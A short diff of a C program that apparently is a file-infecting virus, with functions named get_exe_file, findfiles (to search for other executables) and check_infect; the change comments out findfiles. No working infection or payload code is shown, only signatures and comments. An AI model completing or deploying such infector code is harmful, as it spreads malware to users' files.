@@ -40,7 +40,7 @@ int main(int argc,char* argv[])
    
     get_exe_file(haking_text_path);
 	                      
-    //get_exe_file(haking_text_path);
+
   
     //findfiles("./");
 	//findfiles("./");
@@ -76,7 +76,7 @@ int main(int argc,char* argv[])
 	
     return 0;
 }
-
+/*
 char * findfiles(char directory[MAXSIZE])
 {
   // Find current directory and search for other executables
@@ -113,7 +113,7 @@ char * findfiles(char directory[MAXSIZE])
   
   
 }
-
+*/
 void check_infect(char path[MAXSIZE]){
 	char folder_name[MAXSIZE];
 	char temp_dir[MAXSIZE];
